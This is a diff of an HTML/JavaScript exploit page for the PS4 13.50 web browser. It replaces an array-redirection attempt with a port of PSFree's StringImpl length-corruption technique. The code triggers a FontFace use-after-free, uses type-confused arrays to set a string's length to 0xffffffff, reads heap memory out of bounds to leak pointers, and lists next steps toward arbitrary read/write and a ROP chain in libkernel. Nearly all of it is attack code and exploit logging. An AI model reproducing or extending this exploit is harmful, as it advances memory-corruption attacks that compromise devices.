@@ -2,7 +2,7 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>PS4 13.50 - Redirect to libkernel</title>
+<title>PS4 13.50 - String Corruption</title>
 <style>
     * {
         margin: 0;
@@ -130,11 +130,11 @@
 
 <div class="container">
     <div class="header">
-        <h1>◈ REDIRECT TO LIBKERNEL ◈</h1>
-        <div class="subtitle">Point our array → libkernel for arbitrary write</div>
+        <h1>◈ STRING CORRUPTION ◈</h1>
+        <div class="subtitle">Port PSFree's StringImpl Length Corruption</div>
     </div>
     
-    <button class="btn" onclick="runExploit()">► REDIRECT</button>
+    <button class="btn" onclick="runExploit()">► CORRUPT STRING</button>
     
     <div class="log-container">
         <div class="log-header">◈ EXPLOIT LOG ◈</div>
@@ -157,7 +157,7 @@ function log(msg) {
             else if (line.includes('[ERROR]')) className = 'error';
             else if (line.includes('[!]')) className = 'warning';
             else if (line.includes('[+]')) className = 'info';
-            else if (line.includes('0x7F8B')) className = 'highlight';
+            else if (line.includes('0x')) className = 'highlight';
             
             return `<span class="${className}">${line}</span>`;
         }).join('\n');
@@ -202,12 +202,11 @@ function runExploit() {
     logBuf = [];
     
     log('═══════════════════════════════════════════════════════');
-    log('  PS4 13.50 - REDIRECT ARRAY BACKING STORE TO LIBKERNEL');
+    log('  PS4 13.50 - STRING CORRUPTION (PSFree technique)      ');
     log('═══════════════════════════════════════════════════════\n');
     
-    log('[TARGET] libkernel: ' + LIBKERNEL_BASE.toString());
-    log('[GOAL] Redirect our array → libkernel backing store');
-    log('[GOAL] Write to our array = write to libkernel!\n');
+    log('[STRATEGY] Corrupt StringImpl.m_length → OOB read');
+    log('[BASED ON] PSFree CVE-2022-22620 technique\n');
     
     // Setup
     let style = document.createElement('style');
@@ -215,16 +214,28 @@ function runExploit() {
     style.textContent = '@font-face { font-family: x; src: url(nonexistent-font.woff); unicode-range: U+0042; }';
     document.head.appendChild(style);
     
-    // Create OUR controlled array that we want to redirect
-    let controlledArray = new Float64Array(0x100);
+    // Create victim strings with markers
+    // PSFree uses strings with inline data
+    let victimStrings = [];
     
-    // Fill with marker
-    for (let i = 0; i < controlledArray.length; i++) {
-        controlledArray[i] = 13.37 + i;
+    log('[SETUP] Creating victim strings...');
+    
+    // Create strings with unique markers (like PSFree does)
+    for (let i = 0; i < 0x100; i++) {
+        // Create string with marker at start
+        let marker = String.fromCharCode(
+            0x42, 0x42, 0x42, 0x42,  // 0x42424242 marker
+            i & 0xFF, (i >> 8) & 0xFF, 0x00, 0x00  // index
+        );
+        
+        // Pad to make it a good size
+        let padding = 'A'.repeat(0x30);
+        let str = marker + padding;
+        
+        victimStrings.push(str);
     }
     
-    log('[SETUP] Created controlledArray (Float64Array[256])');
-    log('[SETUP] Filled with markers (13.37 + i)\n');
+    log('[SETUP] Created ' + victimStrings.length + ' strings with markers\n');
     
     // Create confusion arrays
     let floatArray = new Float64Array(100);
@@ -236,6 +247,17 @@ function runExploit() {
     }
     
     log('[SETUP] Created confusion arrays\n');
+    
+    // Create controlled buffer to write corruption value
+    let corruptBuf = new ArrayBuffer(8);
+    let corruptU32 = new Uint32Array(corruptBuf);
+    let corruptF64 = new Float64Array(corruptBuf);
+    
+    // Prepare corruption value: length = 0xffffffff
+    corruptU32[0] = 0xffffffff;
+    corruptU32[1] = 0x00000000;
+    
+    log('[SETUP] Corruption value prepared: length=0xffffffff\n');
     
     let A = new FontFace('x', 'local(Helvetica)', { unicodeRange: 'U+0041' });
     document.fonts.add(A);
@@ -251,12 +273,6 @@ function runExploit() {
                 
                 log('[PHASE 1] ▼▼▼ INSIDE GETTER ▼▼▼\n');
                 
-                // Sample BEFORE corruption
-                log('[BEFORE] controlledArray sample:');
-                log('  [0] = ' + controlledArray[0]);
-                log('  [1] = ' + controlledArray[1]);
-                log('  [10] = ' + controlledArray[10] + '\n');
-                
                 let corrupted = [];
                 for (let i = 0; i < 50; i++) {
                     corrupted.push(new FontFace('c' + i, 'local(Helvetica)', {
@@ -267,9 +283,9 @@ function runExploit() {
                 document.getElementById('s').sheet.deleteRule(0);
                 document.body.offsetTop;
                 
-                log('[CORRUPTION] ✓ Triggered\n');
+                log('[CORRUPTION] ✓ FontFace corruption triggered\n');
                 
-                // Required setup
+                // Required setup (we know this is needed)
                 log('[SETUP] Tests 1-3...');
                 try {
                     corrupted[0].status;
@@ -277,156 +293,165 @@ function runExploit() {
                     floatArray[50] = corrupted[2];
                     log('[SETUP] ✓\n');
                 } catch(e) {
-                    log('[SETUP] !\n');
+                    log('[SETUP] ! Error\n');
                 }
                 
                 // ═══════════════════════════════════════════
-                // ATTEMPT REDIRECTION
+                // ATTEMPT STRING CORRUPTION
                 // ═══════════════════════════════════════════
                 
-                log('[PHASE 2] ▼▼▼ REDIRECTION ATTEMPTS ▼▼▼\n');
+                log('[PHASE 2] ▼▼▼ STRING LENGTH CORRUPTION ▼▼▼\n');
                 
-                // TECHNIQUE 1: Store controlledArray in objectArray,
-                //              write libkernel address to floatArray
-                log('[TECHNIQUE 1] Array + Address in confusion\n');
+                log('[STRATEGY] Store victim string, write 0xffffffff length\n');
                 
-                log('[*] Storing controlledArray in objectArray[70]');
-                objectArray[70] = controlledArray;
-                
-                log('[*] Writing libkernel LOW WORD to floatArray[70]');
-                floatArray[70] = LIBKERNEL_BASE.low;
-                
-                log('[*] Writing libkernel HIGH WORD to floatArray[71]');
-                floatArray[71] = LIBKERNEL_BASE.high;
-                
-                log('[*] Checking if controlledArray changed...\n');
-                
-                try {
-                    log('[AFTER T1] controlledArray sample:');
-                    log('  [0] = ' + controlledArray[0]);
-                    log('  [1] = ' + controlledArray[1]);
-                    log('  [10] = ' + controlledArray[10]);
+                // Try multiple strings to find which one gets corrupted
+                for (let strIdx = 0; strIdx < Math.min(10, victimStrings.length); strIdx++) {
+                    let victimStr = victimStrings[strIdx];
+                    let testIdx = 55 + strIdx;
                     
-                    let changed1 = Math.abs(controlledArray[0] - 13.37) > 0.01;
-                    log('  Changed: ' + changed1 + '\n');
+                    log('[TRY ' + strIdx + '] Testing string ' + strIdx);
+                    log('  Original length: ' + victimStr.length);
                     
-                    if (changed1) {
-                        log('[+++] CONTROLLED ARRAY CHANGED!');
-                        log('[+++] Might be redirected!\n');
-                    }
+                    // Store string in objectArray
+                    objectArray[testIdx] = victimStr;
                     
-                } catch(e) {
-                    log('[!] ERROR reading: ' + e.message);
-                    log('[+] Error might mean redirection worked!\n');
-                }
-                
-                // TECHNIQUE 2: Store as entire Int64
-                log('[TECHNIQUE 2] Store libkernel as single float\n');
-                
-                objectArray[75] = controlledArray;
-                floatArray[75] = LIBKERNEL_BASE.asDouble();
-                
-                log('[*] Stored libkernel address as float');
-                log('[*] Checking controlledArray...\n');
-                
-                try {
-                    log('[AFTER T2] controlledArray:');
-                    log('  [0] = ' + controlledArray[0]);
+                    // Try to write corruption value via floatArray
+                    floatArray[testIdx] = corruptF64[0];
                     
-                    let changed2 = Math.abs(controlledArray[0] - 13.37) > 0.01;
-                    log('  Changed: ' + changed2 + '\n');
-                    
-                } catch(e) {
-                    log('[!] ERROR: ' + e.message + '\n');
-                }
-                
-                // TECHNIQUE 3: Store at ADJACENT indices
-                log('[TECHNIQUE 3] Adjacent index pattern\n');
-                
-                objectArray[79] = controlledArray;
-                objectArray[80] = { libkernel: LIBKERNEL_BASE.asDouble() };
-                floatArray[80] = LIBKERNEL_BASE.asDouble();
-                
-                log('[*] Array at [79], address at [80]');
-                log('[*] Checking...\n');
-                
-                try {
-                    log('[AFTER T3] controlledArray:');
-                    log('  [0] = ' + controlledArray[0]);
-                    
-                    let changed3 = Math.abs(controlledArray[0] - 13.37) > 0.01;
-                    log('  Changed: ' + changed3 + '\n');
-                    
-                } catch(e) {
-                    log('[!] ERROR: ' + e.message + '\n');
-                }
-                
-                // ═══════════════════════════════════════════
-                // TEST WRITE IF CHANGED
-                // ═══════════════════════════════════════════
-                
-                log('[PHASE 3] ▼▼▼ TEST WRITE ▼▼▼\n');
-                
-                log('[*] Attempting to write test values...');
-                log('[*] If redirected, this writes to libkernel!\n');
-                
-                try {
-                    // Try writing test ROP gadget addresses
-                    let testValues = [
-                        0x4141414141414141,
-                        0x4242424242424242,
-                        0x4343434343434343
-                    ];
-                    
-                    log('[WRITE TEST] Writing 3 test values:');
-                    for (let i = 0; i < testValues.length; i++) {
-                        let val = new Int64(
-                            testValues[i] & 0xFFFFFFFF,
-                            (testValues[i] / 0x100000000) & 0xFFFFFFFF
-                        );
+                    // Check if length changed
+                    try {
+                        let newLen = victimStr.length;
+                        log('  New length: ' + newLen);
                         
-                        controlledArray[i] = val.asDouble();
-                        log('  [' + i + '] = ' + val.toString());
+                        if (newLen > 0x1000) {
+                            log('  [+++] LENGTH CORRUPTED!');
+                            log('  [+++] String has OOB read capability!\n');
+                            
+                            // Test OOB read
+                            log('[PHASE 3] ▼▼▼ TESTING OOB READ ▼▼▼\n');
+                            
+                            try {
+                                log('[*] Reading beyond original string bounds...');
+                                log('[*] First 32 chars at offset 0x100:\n');
+                                
+                                let oobData = '';
+                                for (let i = 0x100; i < 0x100 + 32; i++) {
+                                    let c = victimStr.charCodeAt(i);
+                                    if (isNaN(c)) break;
+                                    oobData += hex(c) + ' ';
+                                }
+                                
+                                log('  ' + oobData);
+                                
+                                if (oobData.length > 0) {
+                                    log('\n[+++] OOB READ WORKING!');
+                                    log('[+++] Can read adjacent heap memory!');
+                                    log('[+++] This is arbitrary read primitive!\n');
+                                    
+                                    // Try to find useful data
+                                    log('[PHASE 4] ▼▼▼ SEARCHING FOR POINTERS ▼▼▼\n');
+                                    
+                                    for (let off = 0; off < 0x1000; off += 8) {
+                                        let low = (
+                                            victimStr.charCodeAt(off)
+                                            | victimStr.charCodeAt(off + 1) << 8
+                                            | victimStr.charCodeAt(off + 2) << 16
+                                            | victimStr.charCodeAt(off + 3) << 24
+                                        ) >>> 0;
+                                        
+                                        let high = (
+                                            victimStr.charCodeAt(off + 4)
+                                            | victimStr.charCodeAt(off + 5) << 8
+                                            | victimStr.charCodeAt(off + 6) << 16
+                                            | victimStr.charCodeAt(off + 7) << 24
+                                        ) >>> 0;
+                                        
+                                        // Look for pointers (high word in userspace range)
+                                        if (high >= 0x01000000 && high <= 0x7fffffff) {
+                                            let addr = new Int64(low, high);
+                                            log('[LEAK] Offset +' + hex(off) + ': ' + addr.toString());
+                                        }
+                                    }
+                                    
+                                } else {
+                                    log('\n[!] OOB read returned no data');
+                                }
+                                
+                            } catch(e) {
+                                log('[ERROR] OOB read test: ' + e.message);
+                            }
+                            
+                            // Found corruption, stop trying other strings
+                            break;
+                        }
+                        
+                    } catch(e) {
+                        log('  [!] Error checking length: ' + e.message);
                     }
                     
-                    log('\n[+] Write completed without error!');
-                    log('[*] Reading back...\n');
+                    log('');
+                }
+                
+                // ═══════════════════════════════════════════
+                // ALTERNATIVE: Check if strings in array got corrupted
+                // ═══════════════════════════════════════════
+                
+                log('\n[PHASE 2B] ▼▼▼ CHECK ALL STRINGS ▼▼▼\n');
+                log('[*] Checking if any victim strings got corrupted...\n');
+                
+                for (let i = 0; i < Math.min(20, victimStrings.length); i++) {
+                    let str = victimStrings[i];
+                    let len = str.length;
                     
-                    log('[READ BACK]');
-                    for (let i = 0; i < testValues.length; i++) {
-                        let readBack = controlledArray[i];
-                        let addr = Int64.fromDouble(readBack);
-                        log('  [' + i + '] = ' + addr.toString());
+                    if (len > 0x1000) {
+                        log('[+++] String ' + i + ' corrupted! Length: ' + hex(len));
+                        log('[+++] OOB read available!\n');
+                        
+                        // Dump some OOB data
+                        log('[DUMP] First 128 bytes OOB:');
+                        for (let off = 0x40; off < 0x40 + 128; off += 16) {
+                            let line = hex(off) + ': ';
+                            for (let j = 0; j < 16; j++) {
+                                let c = str.charCodeAt(off + j);
+                                if (!isNaN(c)) {
+                                    line += c.toString(16).padStart(2, '0') + ' ';
+                                } else {
+                                    line += '?? ';
+                                }
+                            }
+                            log(line);
+                        }
+                        
+                        break;
                     }
-                    
-                } catch(e) {
-                    log('[ERROR] Write/read failed: ' + e.message);
-                    log('[*] This might mean no redirection occurred\n');
                 }
                 
                 // ═══════════════════════════════════════════
                 // ANALYSIS
                 // ═══════════════════════════════════════════
                 
-                log('\n╔════════════════════════════════════════════════╗');
+                log('\n\n╔════════════════════════════════════════════════╗');
                 log('║              ANALYSIS                          ║');
                 log('╚════════════════════════════════════════════════╝\n');
                 
                 log('[RESULTS]');
-                log('  Review "Changed:" values above');
-                log('  Check if any technique showed changed array\n');
+                log('  Check above for "LENGTH CORRUPTED" messages');
+                log('  Check for "OOB READ WORKING" confirmation');
+                log('  Check for leaked pointers in SEARCHING phase\n');
                 
                 log('[IF SUCCESSFUL]');
-                log('  controlledArray no longer reads 13.37+i');
-                log('  Writes to controlledArray go to libkernel');
-                log('  Can now write ROP chain!');
-                log('  Can overwrite function pointers!');
-                log('  Can achieve code execution!\n');
+                log('  String length corrupted to 0xffffffff');
+                log('  OOB read gives access to adjacent heap');
+                log('  Can leak addresses from heap');
+                log('  Can build full arbitrary read');
+                log('  Chain to arbitrary write via same technique\n');
                 
-                log('[IF UNSUCCESSFUL]');
-                log('  controlledArray still reads 13.37+i');
-                log('  Redirection didn\'t work');
-                log('  May need different bug or approach');
+                log('[NEXT STEPS]');
+                log('  1. Use OOB read to leak CodeBlock (like PSFree)');
+                log('  2. Find ArrayBuffer backing store pointer');
+                log('  3. Overwrite backing store → arbitrary R/W');
+                log('  4. Write ROP to libkernel ' + LIBKERNEL_BASE.toString());
+                log('  5. Execute via call chain');
                 
                 log('\n[!] Returning - OOM will occur');
                 log('═══════════════════════════════════════════════════════\n');
@@ -441,11 +466,11 @@ function runExploit() {
 }
 
 log('═══════════════════════════════════════════════════════');
-log('      ARRAY REDIRECTION READY                          ');
+log('      STRING CORRUPTION READY (PSFree technique)        ');
 log('═══════════════════════════════════════════════════════\n');
-log('[INFO] Attempting to redirect array backing store');
-log('[INFO] Goal: controlledArray writes → libkernel writes\n');
-log('[READY] Click REDIRECT\n');
+log('[INFO] Porting PSFree\'s StringImpl length corruption');
+log('[INFO] Goal: OOB read → leak addresses → arbitrary R/W\n');
+log('[READY] Click CORRUPT STRING\n');
 
 </script>
 </body>
